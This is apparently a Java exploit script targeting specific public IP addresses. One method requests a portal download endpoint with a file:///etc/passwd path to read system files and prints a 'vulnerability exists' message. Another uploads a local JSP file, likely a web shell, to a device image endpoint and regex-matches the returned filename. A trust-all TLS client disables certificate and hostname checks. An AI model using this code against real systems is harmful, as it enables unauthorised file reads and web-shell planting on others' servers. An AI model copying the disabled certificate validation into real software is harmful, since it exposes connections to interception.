import okhttp3.*;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class httptest {

    public static void main(String[] args) {
//        PostTest();
        test();
    }
    public static void GetTest(){
        OkHttpClient client = getInsecureOkHttpClient();
        Request request = new Request.Builder()
                .url("http://111.39.14.147:8081/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd ")
                .get()
                .build();

        try {
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();


//            System.out.println("Response: " + responseBody);
            if (responseBody.contains("root")){
                System.out.println("漏洞存在！！！");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void PostTest(){
        OkHttpClient client = getInsecureOkHttpClient();
        String url = "https://111.85.91.5:4430/emap/devicePoint_addImgIco?hasSubsystem=true";

        File file = new File("a.jsp");
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("upload", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        try {
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            System.out.println("Response: " + responseBody);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static OkHttpClient getInsecureOkHttpClient() {
        try {
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {
                        }

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {
                        }

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new java.security.cert.X509Certificate[]{};
                        }
                    }
            };

            SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            OkHttpClient.Builder builder = new OkHttpClient.Builder();
            builder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
            builder.hostnameVerifier((hostname, session) -> true);

            return builder.build();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public static void test(){
        String str = "{\"code\":1,\"data\":\"ico_res_0c31d0f037b1_on.jsp\"}";
        String pattern = "\"ico_res_[0-9a-fA-F]+_on.jsp\""; // 正则表达式，匹配你要的字符串

        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(str);
        if (m.find()) {
            System.out.println("找到了匹配项: " + m.group());
        } else {
            System.out.println("没有找到匹配项");
        }
    }
}
